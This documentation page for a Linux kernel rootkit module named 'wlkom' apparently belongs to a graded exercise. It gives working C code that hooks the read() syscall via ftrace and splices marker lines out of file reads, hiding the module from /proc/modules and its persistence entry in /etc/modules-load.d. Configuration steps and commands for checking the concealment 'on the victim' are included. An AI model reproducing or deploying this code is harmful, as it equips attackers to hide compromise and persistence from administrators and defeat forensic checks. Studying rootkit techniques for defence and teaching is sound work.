---
title: Hide Lines from Files
description: Hooks the read() syscall via ftrace to filter lines containing specific strings before they reach userland.
---

**Optional · 2 pts**

Hooks the `read()` syscall via ftrace to filter lines containing specific strings before they reach userland.

## How it works

Even if `lsmod` and `/proc/modules` are hidden via the module list, a determined user could still do `cat /proc/modules`. The **`read()` hook** addresses this by intercepting file reads and scanning the returned buffer for lines that match a marker in `hide_lines[]`. When a match is found, the hook splices the line out of the buffer in place — the caller receives a shorter buffer as if the line was never there.

The same hook also hides the persistence entry in `/etc/modules-load.d/wlkom.conf`: a `cat` of the file won't show the `wlkom` line even though it is physically present on disk.

## The `S_ISREG` guard

`read()` is called for every readable file descriptor: regular files, PTYs, sockets, pipes, character devices. Applying the filtering logic to all of them would corrupt network streams and terminal input/output.

`hook_read` uses `fget()` to inspect the underlying inode and bails out immediately unless the file is a regular file (`S_ISREG`):

```c
struct file *f = fget(regs->di);
if (!f)
    return orig_read(regs);

umode_t mode = file_inode(f)->i_mode;
fput(f);

if (!S_ISREG(mode))
    return orig_read(regs);
```

This ensures PTYs, sockets, pipes, and devices are passed through untouched.

## Filtering logic

```c
static asmlinkage ssize_t hook_read(const struct pt_regs *regs)
{
    // S_ISREG guard (above)

    ssize_t ret = orig_read(regs);
    if (ret <= 0)
        return ret;

    char __user *buf  = (char __user *)regs->si;
    char        *kbuf = kmalloc(ret + 1, GFP_KERNEL);
    copy_from_user(kbuf, buf, ret);
    kbuf[ret] = '\0';

    // iterate over hide_lines[] markers
    for (int i = 0; hide_lines[i]; i++) {
        char *pos = kbuf;
        while ((pos = strstr(pos, hide_lines[i])) != NULL) {
            char *end = strchr(pos, '\n');
            if (!end) { *pos = '\0'; ret = pos - kbuf; break; }
            end++;
            size_t tail = (kbuf + ret) - end;
            memmove(pos, end, tail);
            ret -= (end - pos);
            kbuf[ret] = '\0';
        }
    }

    copy_to_user(buf, kbuf, ret);
    kfree(kbuf);
    return ret;
}
```

## How it is installed

`hook_read` is installed in `hide_files_init()` alongside `hook_getdents64`, using the same ftrace mechanism: `get_symbol()` locates `__x64_sys_read`, `ftrace_set_filter_ip()` pins the hook to that address, and `register_ftrace_function()` activates it. See [Hide Files](/rootkit/hide-files) for the full ftrace setup.

## Buffer transformation

```
Buffer from real read():               Filtered buffer returned to caller:
┌────────────────────────┐             ┌────────────────────────┐
│ nvidia 1234567 0       │             │ nvidia 1234567 0       │
├────────────────────────┤             ├────────────────────────┤
│ wlkom 98304 0  ← hit  │ ─splice──►  │ bluetooth 458752 2     │
├────────────────────────┤  memmove    ├────────────────────────┤
│ bluetooth 458752 2     │             │ vboxguest 90112 2      │
├────────────────────────┤             └────────────────────────┘
│ vboxguest 90112 2      │             return value -= line length
└────────────────────────┘
```

## Configuration

Add entries to `hide_lines[]` in `hide.c` before the `NULL` terminator:

```c
static const char *hide_lines[] = {
    "wlkom",
    NULL,
};
```

## Verification

```sh
# On the victim after insmod:

$ lsmod | grep wlkom
# no output (module list hook)

$ cat /proc/modules | grep wlkom
# no output (read() hook strips the line)

$ cat /etc/modules-load.d/wlkom.conf
# no output (persistence line hidden)

$ dmesg | grep wlkom
# kernel ring buffer uses /dev/kmsg — read() hook does not apply here
```
